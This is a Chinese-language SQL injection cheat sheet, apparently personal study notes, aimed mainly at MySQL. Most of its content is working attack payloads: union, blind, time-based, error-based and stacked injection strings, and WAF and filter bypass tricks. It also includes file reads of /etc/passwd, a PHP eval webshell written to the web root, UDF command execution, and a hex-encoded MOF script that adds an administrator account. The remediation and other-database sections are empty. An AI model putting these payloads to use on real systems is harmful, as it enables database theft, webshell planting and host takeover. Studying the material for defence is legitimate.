# SQL



SQL 的全名是结构化查询语言。简单来说，它是查询资料库的一种程序语言。

在许多企业或工厂中，它可以帮助我们在茫茫的资料中，找出我们想要的资讯。尤其是当资料量已经放大到超过好几百时，我们都希望能有一个工具能快速地找到有用的讯息，它就是SQL。

## 0x01 MySQL

### 1. 常见类型

#### 1.1 联合注入

联合注入常见于页面中存在回显位置，能够直接回显获取到数据，关键需要利用UNION。不过，需要注意的是前一个语句执行结果要为空，才会返回后面语句的执行结果。

-  注入步骤 

- -  **判断注入点**(注入点一般分为字符型(需要' 或其它字符进行闭合的)和数字型(可以直接注入不需要闭合))
    `?id=1' and 1=1#` 或者是`?id=1' && 1=1#`(字符型) 又或者`?id=1 and 1=1#`(数字型)... 
  -  **判断字段数量**(`select * from ...` 一共存在几个字段，因为`union select 1,2,3...` 要和 * 中的字段个数匹配)
    `?id=1' order by 3#`(3不报错，4报错，字段数为3) 
  -  **判断回显位置**(使前面的语句的执行结果为空，就是让搜索一条不存在的数据)
    `?id = -1' union select 1,2,3#`(`union select` 后只要占够字段数个数的位置就行，数字可以随意，但是为了方便观察，所以就区分开) 
  -  **获取数据库信息**
    `?id = -1' union select 1,1,database()`(还可以获取user、version等等) 
  -  **获取表名**(因为存在多个表名的情况而页面执行回显一条，相当于执行结果是一个数组但是数组没有办法赋值给字符串，那么利用聚合函数将执行结果拼成一行。)
    `?id = -1' union select 1,2,group_concat(table_name) from information_schema.tables table_schema=database()#` 
  -  **获取列名**
    `?id = -1' union select 1,2,group_concat(column_name) from information_schema.columns table_name='users'#` 
  -  **获取数据**
    `?id = -1' union select 1,2,group_concat(password) users#` 

#### 1.2 布尔盲注

常见的布尔盲注场景有两种，一是返回值只有True或False的，二是Order by盲注。

-  **逐字猜解法** 

- -  **常见payload形式**
    `id=0’ or ascii(substr((database()),1,1))=112—+` 
  -  **截断方式** 

- - -  `**substring/substr(str,startPosition,len)**` 
    -  `**mid(str,startPosition,len)**` 

- -  `**right(str,len)**`
    `right`是从字符串的右边截取指定长度的字符串，仅仅是用right只能截取指定长度，但是可以配置`ascii`函数使用来获取指定位置的`ascii`码
  -  `**left(str,len)**`
      	从左到右截取字符串，还是不能够截取指定位置的字符，那么我们知道 ascii函数转化的是第一个字符，如果单纯使用left的话，不论截取多长第一个字母都是不会变的，所以我们可以搭配`reverse`。
  -  `**regexp**`
      利用`regexp`匹配字符串，通过`^`可以指定起始位置，`$标记开头位置`。
  -  `**rlike**`
        使用规则和`regexp`同
  -  `**trim(TRIM([{BOTH | LEADING | TRAILING} [remstr] FROM str))**` 

- - -  移除字符串首尾（`BOTH`）/句首（`LEADING`）/句尾（`TRAILING`)的字串 

- - - -  一般的规则是一下这样的，存在返回移除后的结果，不存在则返回本身。 **我们可以利用相等来判断是哪一个字符。**

- -  `**insert**` 

- - -  `SELECT insert((insert(目标字符串,1,截取的位数,'')),2,9999999,'');` 
    -  分析：`insert`可以理解为一个替换函数，第一个insert把需要的字符替换了出来，第二个`insert`将字符串的第二个位置开始替换为空，保证每次只有一个字符。

- -  **比较方式** 

- - -  `=、>、<`
      常见的比较大小的方式 
    -  加减运算
      通过加减运算和`and`或`or`配合就能够知道运算结果。
    -  `in`
      判断某个元素是否在另外一个字符串中，大小写不敏感
      只能匹配相同的字符串,如果不相同的话返回就是错误的.
    -  `Between...and`
      当`=,like, regexp,>,<`被过滤的情况下这是一个不错的选择，相当于一个边界的作用。
      它是支持16进制和数字的，当单引号被过滤可以利用16进制或者是数字代替。
    -  `**like**`
      可以替代=来使用了
    -  **异或(**`**^**`**)**
      通常使用在不能使用注释符的情况下，不过对于这种情况也可以使用`-`
    -  `**strcmp**` 

- - - - 比较两个字符串是否相同，如果相同返回0，不相同返回-1

- - -  `greatest(n1,n2,n3...)` 

- - - - `id=1 and greatest(ascii(substr(database(),0,1)),64)=64`

-  `**Order by**` **盲注** 

- -  `order by asc,(select 1,2,3);--+` 
  -  `**order by true/false**`
      	会存在两种不同的排序结果，那么根据这个就可以判断我们插入执行的语句是`true`还是`false`，还是需要通过编写脚本去进行记录。 

- - -  `order by if(1=1,1,sleep(2))`
      也可以在`order by`后使用时间盲注的形式。 

- -  **与UNION结合比较**
    `payload:username = admin' union 1,2,'' order by 2`
    不过这个是大小写不敏感的，如果需要判断大小写需要加上`binary`



#### 1.3 时间盲注

时间盲注页面中是没有true/false的，只会返回相同的结果。

例如:在登录页面中，不管是 用户名还是密码错误 都是显示 用户名或密码错误。

这种情况下，我们可以通过根据页面的请求时间来判断语句执行的结果。

时间盲注 我的理解就是 相当于 布尔盲注+判断结构+延时函数且现在的判断依据变成了**页面执行的时间长短.**

常用的两种判断结构：

-  `IF`
  可以理解为我们学习代码中的三目表达式，条件成立返回第一个逗号后的表达式。反之，就是最后一个。 
-  `case`
  完整的表达式是:`case when (condition) then xx else xx end`
-  如果没有`if`和`case`
  利用`sleep(5*(condition))/benchmark(1000000*(1=1),sha1('me7eorite'))`，通过条件返回的结果来计算延时的时间，不一定需要用乘法。



一般来说时间盲注存在5种延时函数：



-  `**sleep(3)**` 

- -  `id=' or if(ascii(substr(database(),1,1))>114,sleep(3),0)%23`

-  `benchmark()` 

- -  `select * from ctf where id ='1' and if(ascii(substr(database(),1,1))=99,benchmark(10000000,sha(1)),0);`

-  **笛卡尔积** 

- -  `select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C`

-  `**get_lock**` 

- - `select get_lock('test',1)`
  - 需要两个session，在第一个session中加锁，绕后在第二个窗口中查询..

-  `**rlike+rpad**` 

- -  `rpad(1,3,’a’)`是指用a填充第一位的字符串以达到第二位的长度,通过填充一个很大的数量然后通过`rlike`进行匹配实现延时。



#### 1.4 报错注入



-  **报错盲注** 

- - `exp(1)` 

- - -
    - 如果没有过滤`if`和`case`,那时间盲注基本上是一样的，只是将延时函数换成报错函数
    - 如果过滤`if`和`case`的话，那么利用`exp((1=1)+709)` 、`exp((1=1)*710)` 、`exp(710-(1=1))...`

- - `cot(0)` 

- - -
    - 0报错，1不报错，只要懂了这个构造方式也可以理解了。

- - `pow(1,2)` 

- - -
    - `pow(2-(1=(xxx)),9999)...` 加减乘都可以。

-  **报错回显** 

报错注入是利用mysql在出错的时候会引出查询信息的特征

- - `floor` 

- - - `select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);`

- - `updatexml` 

- - - `select * from users where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));`

- - `extractvalue` 

- - - `select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));`

- - `exp` 

- - - `select * from test where id=1 and exp(~(select * from(select user())a));`



#### 1.5 堆叠注入



`select`被过滤一般只能使用堆叠注入或者是在mysql8的情况



- 预编译 

- - `id=1';Set @x=0x31;Prepare a from “select balabala from table1 where 1=?”;Execute a using @x;`
  - `set @x=0x73656c6563742062616c6162616c612066726f6d207461626c653120776865726520313d31;prepare a from @x;execute a;`

- `**Handler**` 

- - `handler tableName open as xx;` //以某个表作为句柄打开
  - `handler xx read first;` //读取所有字段的第一条数据
  - `handler xx read next;` //读取所有字段的下一条数据
  - `handler xx close;` //关闭句柄



#### 1.6 文件操作



**前提:**



- 用户是否存在读写权限，Mysql数据库中的user表中的`file_priv`是否为Y
- **secure-file-priv**(`select @@secure_file_priv`) 

- - 无限制:不存在内容
  - NULL:禁止文件读写
  - 目录名：可操作的目录



**文件读写**

- **读文件** 

- - `select load_file('file_path');`
  - `load data infile "/etc/passwd" into table 库里存在的表名 FIELDS TERMINATED BY 'n';`
  - `load data local infile "/etc/passwd" into table 库里存在的表名 FIELDS TERMINATED BY 'n';`

- **写文件** 

- - `select 1,"<?php eval($_POST['cmd']);?>" into outfile '/var/www/html/1.php';`
  - `select 2,"<?php eval($_POST['cmd']);?>" into dumpfile '/var/www/html/1.php';`



**日志**

由于mysql在5.5.53版本之后，`secure-file-priv`的值默认为`NULL`，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过，不过这种方式一般只有在于PHPMyAdmin、cms、堆叠注入中才可以利用。



```plain
set global general_log_file = '/var/www/html/1.php';`
set global  general_log =  on ;
```



### 2.bypass



#### 2.0 注入点

-  直接注入`?id=123'#` 
-  单引号逃逸 

- -  `?username=admin\&password=|| 1=1#` --> `select * from users where username='admin\' and password='|| 1=1#'` 
  -  宽字节注入(UTF8 -> GBK) 

- - - `id=%df%27or%201=1%23`

-  注释符过滤 

- - `?username='1' or extractvalue/*'&password='*/(1,concat(0x7e,(select user()),0x7e)) or '1'`

#### 2.1 编码绕过

- 16进制 

- - 表名的单引号过滤
  - 读文件`load_file(0x...)`

- 双重`url`编码绕waf



#### 2.2 简单绕过

有些时候由于代码过滤的不严谨，例如使用了`str_replace`这种函数对参数进行过滤。



-  大小写绕过(如果没有使用`strtolower`) 
-  双写绕过 
-  内联注释`/*!*/` 

```plain
/*!UnIon12345SelEcT*/ 1,user()
```


数字范围1000-50540 

-  注释:`(# -> --+ -> ;%00(php<=5.3.4) -> ?id =1' or '1'='1)` 
-  等于:(`like -> regexp -> <> -> in`) 
-  `union select` --> `union(select xx);` 
-  逗号过滤 
   -  `limit 1,1` --> `limit 1 offset 1`
   -  `substr(database(),1,1)` --> `substr(database() from 1 for 1)`
   -  `join` --> `?id = 1 union select * from (select 1)a join (select 2)b join (select 3)c#`
   -  `if` -->`case when ...` or `&& 、 ||`

-  `limit` 
   -  聚合函数 `group_concat、*.concat`
   -  加限制条件 `having`、`where`

-  浮点数 

```plain
Id= 1E0union select 1,user()
Id=\Nunion select 1,user()
Id=1 unionselect user(),2.0from admin
Id=1 union select user(),8e0from admin
Id=1 union select user(),\Nfrom admin
```

#### 2.3 关键字绕过

一般来说，在实际的注入中会存在很多都是过滤了特定的字符，所以我们可以寻找一些类似功能的函数

```plain
mysql8: select -->table
mysql5.7.*(大概这个范围基本上都可以用)
空格: /**/ -> %a0 -> %0a -> +
```

**系统信息函数**

| 函数                 | 说明                                                         |
| -------------------- | ------------------------------------------------------------ |
| `USER()`             | 获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER()。 |
| `DATABASE()`         | 获取当前选择的数据库名，同SCHEMA()。                         |
| `VERSION()`          | 获取当前版本信息。                                           |
| `@@secure_file_priv` | 获取文件操作权限                                             |
| `@@VERSION`          | 返回版本信息                                                 |

**进制转换**

| `ORD(str)`                         | 返回字符串第一个字符的ASCII值。                              |
| ---------------------------------- | ------------------------------------------------------------ |
| `OCT(N)`                           | 以字符串形式返回 `N` 的八进制数，`N` 是一个BIGINT 型数值，作用相当于`CONV(N,10,8)`。 |
| `HEX(N_S)`                         | 参数为字符串时，返回 `N_or_S` 的16进制字符串形式，为数字时，返回其16进制数形式。 |
| `UNHEX(str)`                       | `HEX(str)` 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符。 |
| `BIN(N)`                           | 返回十进制数值 `N` 的二进制数值的字符串表现形式。            |
| `ASCII(str)`                       | 同`ORD(string)`。                                            |
| `CONV(N,from_base,to_base)`        | 将数值型参数 `N` 由初始进制 `from_base` 转换为目标进制 `to_base` 的形式并返回。 |
| `CHAR(N,... [USING charset_name])` | 将每一个参数 `N` 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串。 |

**字符串截断函数**

| 函数                           | 说明                                                         |
| ------------------------------ | ------------------------------------------------------------ |
| `SUBSTR(str,N_start,N_length)` | 对指定字符串进行截取，为SUBSTRING的简单版。                  |
| `SUBSTRING()`                  | 多种格式`SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)`。 |
| `RIGHT(str,len)`               | 对指定字符串从**最右边**截取指定长度。                       |
| `LEFT(str,len)`                | 对指定字符串从**最左边**截取指定长度。                       |
| `RPAD(str,len,padstr)`         | 在 `str` 右方补齐 `len` 位的字符串 `padstr`，返回新字符串。如果 `str` 长度大于 `len`，则返回值的长度将缩减到 `len` 所指定的长度。 |
| `LPAD(str,len,padstr)`         | 与RPAD相似，在`str`左边补齐。                                |
| `MID(str,pos,len)`             | 同于 `SUBSTRING(str,pos,len)`。                              |
| `INSERT(str,pos,len,newstr)`   | 在原始字符串 `str` 中，将自左数第 `pos` 位开始，长度为 `len` 个字符的字符串替换为新字符串 `newstr`，然后返回经过替换后的字符串。`INSERT(str,len,1,0x0)`可当做截取函数。 |
| `CONCAT(str1,str2...)`         | 函数用于将多个字符串合并为一个字符串                         |
| `GROUP_CONCAT(...)`            | 返回一个字符串结果，该结果由分组中的值连接组合而成。         |
| `MAKE_SET(bits,str1,str2,...)` | 根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：`EXP(MAKE_SET((LENGTH(DATABASE())>8)+1,'1','710'))`。 |

#### 2.4 空格绕过

-  Mysql 

  -  行内注释`/**/` 
  -  换行符`%0d%0a` 
  -  制表符`%09` 
  -  括号`()` 
    -  `select(id)from(users);`
      只能对一些字段，不能对关键字。 

- `+`绕过 

  反引号 

```plain
select`id`from`student`
```


只能对表名和列名进行反引号。 

-  Access 

- - `%09、%0a̵、 %0c̵、%0d̵、%16`

-  MSSQL 

- - `[0x01-0x20][0x0a-0x0f][0x1a-0x-1f]`

#### 2.5 `or`过滤



- `imformation_schema` 
  - `innodb(一般只能获取表名)` 

- - `mysql.innodb_table_stats`
    - `innodb_index_stats`v
- - `sys.schema_table_statistics_with_buffer`
  - `sys.schema_auto_increment_columns`
  - `sys.x$schema_flattened_keys`
  - `sys.schema_table_statistics`
  - `sys.schema_tables_with_full_table_scans;`
  - `sys.x$schema_flattened_keys`
- `join`注入 
- - 利用`select`构建一张虚拟表通过`union select`查询我们需要的数据，那么我们就能够过`1,2,3`作为字段名来查询需要的内容。
  - 
  - `join`**报错**
  - 
- **利用比较的方法** 
- - `select ((select 1,binary'c')>(select 1,'bzzzzz'));`

#### 2.6 中间件特性

-  `asp+iis` 

- -  当请求的URL中存在单一的%时，会将它忽略。(修复:判断%x能够组成字符) 
  -  IIS支持unicode的解析，请求的url中存在unicode字符时，iis会自动转换。 

```plain
select:  s%u0065lect ->s%u00f0lect
字母a：   %u0000->%u0041->%u0061->%u00aa->%u00e2
单引号：  %u0027->%u02b9->%u02bc->%u02c8->%u2032->%uff07->%c0%27->%c0%a7->%e0%80%a7
空白：    %u0020->%uff00->%c0%20->%c0%a0->%e0%80%a0
左括号(： %u0028->%uff08->%c0%28->%c0%a8->%e0%80%a8
右括号)： %u0029 ->%uff09->%c0%29->%c0%a9->%e0%80%a9
```

 

-  `asp/asp.net` 

- - 在GET请求下对于`application/x-www-form-urlencoded`提交方式没有过滤的话，就会导致任意注入。

-  `php/Apache` 
-  HPP(HTTP参数污染) 

- -  当给同一个参数提供多个赋值的时候不同的中间件解析不同。 

- - -  `?id=1&id=2&id=3` 

```php
Asp.net + iis：id=1,2,3 
Asp + iis：id=1,2,3 
Php + apache：id=3
```

 

- -  GET+POST 

```plain
GET:http://192.168.125.140/test/sql.aspx?id=1 union/*
post: id=2*/select null,null,null
```

 

-  垃圾数据 



### 3.提权



#### 3.1 udf

自定义函数是数据库功能的一种拓展，用户可以通过自定义函数实现一些特殊的功能且自定义函数也可以在SQL语句中使用。



该漏洞需要导入或写入动态链接库文件到MySQL插件目录下，利用创建自定义函数的方式加载该动态链接库，然后利用该自定义函数执行命令。

#### 3.2 利用方式

根据 2.1提到的 我们需要导入dll或so文件来创建自定义函数，那么动态链接库文件在哪呢？

一般来说有两种途径获取：

1. **msf**



1. **sqlmap**

在sqlmap目录下的`/data/udf/mysql`，sqlmap自带的动态链接库为了防止被误杀都经过编码处理，不能直接使用。 

通过sqlmap目录下的`/extra/cloak/cloak.py`可以对这里加密的动态链接库文件进行处理

```bash
python3 cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o /home/me7eorite/lib_mysqludf_sys_64.dll
#路径不唯一，需要参考自己机子上的sqlmap位置。
```

利用已经解码好的动态链接库文件：[📎udf.zip](https://www.yuque.com/attachments/yuque/0/2022/zip/26696908/1650885062929-2bf5c7b5-7827-453d-8cee-bb60fddd10b7.zip)

##### 获取插件目录

首先我们需要把动态链接库文件放置再插件目录下，该目录可以通过一下命令获取`show variables like "%plugin%";`

![img](assets/1647426729444-1cf67d8f-b30c-4221-8260-d9d60f1a0144.png)

在windows环境下不存在该目录，可以利用NTFS ADS流创建文件夹（成功率不大）

```
select 233 into dumpfile 'D:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation';
```



##### 写入动态链接库文件

**注意：**

- **使用** `**dumpfile**` **而不是** `**outfile**`

- - `**outfile**` 会对写入的内容进行转义，`dumpfile`则是原样写入。



如果不存在文件上传之类的漏洞，我们只能通过执行SQL命令来写入文件

- **利用16进制写入**

```
SELECT 0x7f454c4602... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
```

- **加载上传到其他位置的.so文件并写入**

```
SELECT hex(load_file('/tmp/lib_mysqludf_sys_64.so')) into dumpfile '/usr/lib/mysql/plugin/udf.so'; 
```

[动态链接库_16进制编码](https://www.sqlsec.com/tools/udf.html)

##### 创建自定义函数

- linux的动态链接库文件后缀为.so，windows为.dll

```
CREATE FUNCTIONO sys_eval RETURNS STRING SONAME "xxxx.so";
```

- 利用自定义的`sys_eval`执行命令即可。

![img](assets/1647427046611-172930c0-91f8-4476-9b39-d9ee9dc6f177.png)

##### 删除自定义函数

```
drop function sys_eval;
```

##### 利用在线网页

[https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php](https://github.com/echohun/tools/blob/master/大马/udf.php)

复现失败==

####  4.MOF

##### 4.1 原理

MOF文件是MySQL数据库的拓展文件(`c:/windows/system32/wbem/mof/nullevt.mof`)称为“托管对象格式”。它的作用是每隔五秒就会监控进程创建和死亡。



所以，**利用MOF文件每五秒钟以系统权限执行一次**，那么我们通过mysql文件写入一个MOF文件替换掉原来的MOF文件，系统每隔5秒钟就会执行我们上传的恶意MOF.利用MOF文件中的一段vps脚本，控制这一段脚本的内容使得系统执行命令，实现提权的目的。

##### 4.2 利用方式

**限制条件：**

windows<=2003

mysql在c:windows/system32/mof目录有写权限

```bash
#pragma namespace("\\\\.\\root\\subscription") 

instance of __EventFilter as $EventFilter 
{ 
    EventNamespace = "Root\\Cimv2"; 
    Name  = "filtP2"; 
    Query = "Select * From __InstanceModificationEvent " 
            "Where TargetInstance Isa \"Win32_LocalTime\" " 
            "And TargetInstance.Second = 5"; 
    QueryLanguage = "WQL"; 
}; 

instance of ActiveScriptEventConsumer as $Consumer 
{ 
    Name = "consPCSV2"; 
    ScriptingEngine = "JScript"; 
    ScriptText = 
"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user hacker P@ssw0rd /add\")\nWSH.run(\"net.exe localgroup administrators hacker /add\")"; 
	#核心配置代码
}; 

instance of __FilterToConsumerBinding 
{ 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
};
```

通过16进制编码后将mof保存到指定的文件中。

```sql
select 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile "C:/windows/system32/wbem/mof/test.mof";
```

接下来就是等它自动执行。

### 4.SQL注入修复

#### 4.1 预编译

#### 4.2 PDO

#### 4.3 正则

#### 4.4 其他

1. 防火墙
2. 

## 0x02 SQL Server

### 1.常见类型



### 2.bypass



### 3.提权



## 0x03 Oracle



### 1.常见类型



### 2.bypass



### 3.提权

## 0x05 POSTGRE



## 0x06 SQLMap

### 1.使用简介

### 2.temper编写

### 3.sqlmap中转



# 参考文章



[一文搞定MySQL](https://gem-love.com/2022/01/26/一文搞定MySQL盲注/#trim)

[SQL注入基础整理及Tricks总结](https://www.anquanke.com/post/id/205376#h3-18)

[MySQL 漏洞利用与提权](https://www.sqlsec.com/2020/11/mysql.html#toc-heading-1)

[MySQL注入技巧](https://wooyun.js.org/drops/MySQL注入技巧.html)